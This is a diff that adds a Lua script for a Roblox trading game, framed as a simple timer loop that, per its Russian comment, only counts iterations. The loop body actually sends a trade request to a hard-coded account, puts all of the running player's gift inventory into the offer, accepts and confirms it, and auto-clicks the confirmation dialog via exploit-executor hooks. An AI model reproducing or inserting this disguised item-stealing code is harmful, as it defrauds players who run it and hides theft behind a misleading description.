@@ -1,1 +1,25 @@
+local timer = 0
 
+for i = 1, 10 do
+    wait(30)
+    timer = timer + 1
+
+
+print(timer) -- выводит количество выполненных циклов (в данном случае 10)
+if not Player.PlayerGui.TradeApp.Frame.Visible then
+ ReplicatedStorage.API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer("qweaad005")
+ end 
+ if Player.PlayerGui.TradeApp.Frame.Visible then
+ for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.gifts) do
+ 
+ ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
+ 
+ end
+ ReplicatedStorage.API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
+ ReplicatedStorage.API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
+ for i,v in pairs(getconnections(Player.PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate.MouseButton1Click)) do
+ v.Function()
+ v:Fire()
+ end 
+ end
+end
